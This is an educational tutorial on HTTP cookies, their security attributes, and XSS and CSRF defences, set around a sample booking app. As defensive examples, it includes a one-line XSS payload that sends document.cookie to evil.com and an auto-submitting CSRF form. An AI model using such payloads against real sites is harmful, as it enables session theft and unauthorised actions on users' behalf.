# Cookies

## The Problem: The Browser Has No Memory Either

You already know HTTP is forgetful — every request is a stranger to the
server. But there's a second problem on the other side: the browser is
also forgetful.

JavaScript variables vanish the moment you close a tab. A page reload
wipes everything. If you log in, navigate to another page, and the
browser has nowhere to hold your token — you're logged out.

Something needs to persist small pieces of data on the client side,
survive page navigation, survive reloads, and travel automatically with
every request to the right server.

That something is a **cookie**.

---

## What a Cookie Is

A cookie is a small key-value pair that the server asks the browser to
store and send back automatically on every matching request.

```
name:    session_id
value:   abc123
domain:  miniagoda.com
path:    /
expires: 2024-12-25T00:00:00Z
```

The server sets it. The browser holds it. The browser sends it back
without the user or JavaScript doing anything.

---

## How a Cookie Is Born

### Step 1 — Server sets the cookie

After a successful login, the server includes a `Set-Cookie` header in
its response:

```
HTTP/1.1 200 OK
Set-Cookie: session_id=abc123; HttpOnly; Secure; SameSite=Strict; Expires=Tue, 25 Dec 2024 00:00:00 GMT
```

### Step 2 — Browser stores it

The browser reads the `Set-Cookie` header and saves the cookie in its
local cookie store, associated with the domain `miniagoda.com`.

### Step 3 — Browser sends it automatically

Every subsequent request to `miniagoda.com` includes the cookie in the
`Cookie` header — automatically, without any JavaScript needed:

```
GET /api/v1/bookings
Cookie: session_id=abc123
```

The server reads `session_id`, looks it up, finds the user, and proceeds.

---

## Cookie Attributes — What They Mean

Each attribute on a cookie controls its behaviour. These are not
optional niceties — they are security decisions.

### `Expires` / `Max-Age`
When the cookie should be deleted.

```
Expires=Tue, 25 Dec 2024 00:00:00 GMT
Max-Age=86400   ← seconds from now (1 day)
```

Without this, the cookie is a **session cookie** — it lives until the
browser is closed. With it, the cookie **persists** across browser
restarts until the date passes.

### `HttpOnly`
```
Set-Cookie: session_id=abc123; HttpOnly
```

The cookie cannot be read or modified by JavaScript.
`document.cookie` will not show it. It can only travel in HTTP headers.

This is critical. If your site has an XSS vulnerability (injected
JavaScript), an attacker's script cannot steal an HttpOnly cookie.
Without HttpOnly, one line of JavaScript is enough to steal the session:

```javascript
// attacker's injected script
fetch("https://evil.com/steal?c=" + document.cookie);
```

HttpOnly makes this impossible.

### `Secure`
```
Set-Cookie: session_id=abc123; Secure
```

The cookie is only sent over HTTPS — never over plain HTTP. If the
connection is unencrypted, the browser silently drops the cookie from
the request.

### `SameSite`
Controls whether the cookie is sent on cross-site requests. This
defends against CSRF (see below).

| Value | Behaviour |
|---|---|
| `Strict` | Cookie only sent on requests originating from the same site. Never on cross-site requests. |
| `Lax` | Cookie sent on same-site requests AND top-level navigations (e.g. clicking a link). Not on cross-site POST. |
| `None` | Cookie sent on all requests, including cross-site. Must be combined with `Secure`. |

For authentication cookies, `Strict` or `Lax` is almost always correct.

### `Domain`
```
Set-Cookie: session_id=abc123; Domain=miniagoda.com
```

Which domain the cookie belongs to. The browser only sends the cookie
to this domain and its subdomains. A cookie for `miniagoda.com` will
also be sent to `api.miniagoda.com`, but never to `evil.com`.

### `Path`
```
Set-Cookie: session_id=abc123; Path=/
```

Which URL paths the cookie applies to. `Path=/` means every path on the
domain. `Path=/api` means only requests to `/api/*` will include the
cookie.

---

## What Cookies Solve vs What They Don't

### What cookies solve
- Persisting data across page navigations and reloads
- Automatically attaching credentials to every request without
  JavaScript involvement
- Keeping the user "logged in" across browser restarts (with Expires)

### What cookies don't solve
- The server still needs something to store or verify — a cookie is just
  the transport. The session or token it carries is what actually proves
  identity.
- Cookies are domain-scoped — a cookie set by `miniagoda.com` cannot be
  read by `hotel-partner.com`. This is a feature (security), but means
  cookies don't work for cross-domain scenarios without extra setup.

---

## The Two Threats Cookies Face

### Threat 1 — XSS (Cross-Site Scripting)
An attacker injects JavaScript into your page. That script reads
`document.cookie` and sends it to a server the attacker controls.

**Defence: `HttpOnly`** — makes the cookie invisible to JavaScript.

### Threat 2 — CSRF (Cross-Site Request Forgery)
A user is logged into `miniagoda.com`. They visit `evil.com`, which
contains:

```html
<form action="https://miniagoda.com/api/v1/bookings" method="POST">
  <input type="hidden" name="roomId" value="grand-hyatt-suite" />
</form>
<script>document.forms[0].submit();</script>
```

The browser submits this form to `miniagoda.com`. Because cookies are
sent automatically, `miniagoda.com` receives a valid session cookie — and
thinks the request came from the user. The booking is made without the
user's knowledge.

**Defence: `SameSite=Strict`** — the browser refuses to send the cookie
on any cross-site request, including that form submission.

---

## Cookies vs localStorage

Both store data in the browser. They are not the same thing.

| | Cookie | localStorage |
|---|---|---|
| Sent automatically with requests | ✅ Yes | ❌ No — must be added manually by JavaScript |
| Accessible by JavaScript | Only if not `HttpOnly` | Always |
| Expiry | Controlled by server via `Expires` | Until manually cleared |
| Capacity | ~4 KB | ~5–10 MB |
| Scope | Domain + path | Origin (domain + port) |
| XSS protection possible | ✅ Yes — via `HttpOnly` | ❌ No |
| CSRF protection possible | ✅ Yes — via `SameSite` | N/A (not auto-sent) |

**When to use cookies:** authentication tokens, session IDs — anything
that must travel automatically with requests and must be protected from
JavaScript.

**When to use localStorage:** non-sensitive UI state, user preferences,
cached data that JavaScript needs to read.

Storing a JWT in localStorage is common but means JavaScript can always
read it — XSS becomes a real threat. Storing a JWT in an `HttpOnly`
cookie gives you XSS protection at the cost of needing CSRF protection.
Neither is perfect. The right choice depends on your threat model.

---

## Cookies in the Session Flow

Now that you know what cookies are, the old session story makes more
sense:

```
1. User logs in  →  POST /api/v1/auth/login

2. Server creates a session record:
   session_id: abc123  →  user: shawon, role: GUEST

3. Server responds:
   Set-Cookie: session_id=abc123; HttpOnly; Secure; SameSite=Strict

4. Browser stores the cookie

5. Every future request automatically includes:
   Cookie: session_id=abc123

6. Server reads session_id, looks it up in the DB, finds the user
```

The cookie is just the carrier. The session record in the database is
what actually holds the identity.

---

## Where Cookies Fit With JWTs

JWTs need to be stored somewhere on the client. Two options:

**Option A — localStorage + Authorization header**
```javascript
// Store
localStorage.setItem("access_token", jwt);

// Send manually on each request
fetch("/api/v1/bookings", {
  headers: { "Authorization": "Bearer " + localStorage.getItem("access_token") }
});
```
Simple, but JavaScript can always read the token — XSS is a real risk.

**Option B — HttpOnly cookie**
```
Set-Cookie: access_token=eyJhbG...; HttpOnly; Secure; SameSite=Strict
```
JavaScript cannot read the token. The browser sends it automatically.
CSRF becomes a concern, mitigated by `SameSite=Strict` and CSRF tokens.

Most production applications choose Option B for the added XSS
protection on the authentication token specifically.

---

## Glossary

| Term | Meaning |
|---|---|
| Cookie | A small key-value pair the server asks the browser to store and return |
| `Set-Cookie` | Response header the server uses to create a cookie |
| `Cookie` | Request header the browser uses to send cookies back |
| Session cookie | A cookie with no `Expires` — deleted when the browser closes |
| Persistent cookie | A cookie with `Expires` — survives browser restarts |
| `HttpOnly` | Cookie cannot be read by JavaScript — protects against XSS |
| `Secure` | Cookie only sent over HTTPS |
| `SameSite` | Controls whether the cookie is sent on cross-site requests — protects against CSRF |
| XSS | Cross-Site Scripting — injected JavaScript stealing data from your page |
| CSRF | Cross-Site Request Forgery — a malicious site triggering requests on behalf of a logged-in user |
| localStorage | Browser storage readable by JavaScript — larger capacity, no automatic sending |

---

## One-Paragraph Summary

A cookie is a small piece of data the server plants in the browser via
the `Set-Cookie` response header. The browser stores it and sends it
back automatically on every matching request via the `Cookie` header —
no JavaScript required. This solves the statefulness problem: the server
can recognise the same user across many requests. The `HttpOnly`
attribute hides the cookie from JavaScript (blocking XSS theft),
`Secure` ensures it only travels over HTTPS, and `SameSite` prevents it
from being sent on cross-site requests (blocking CSRF). A cookie is just
the transport mechanism — what it carries (a session ID, a JWT, a
preference value) determines what problem it actually solves.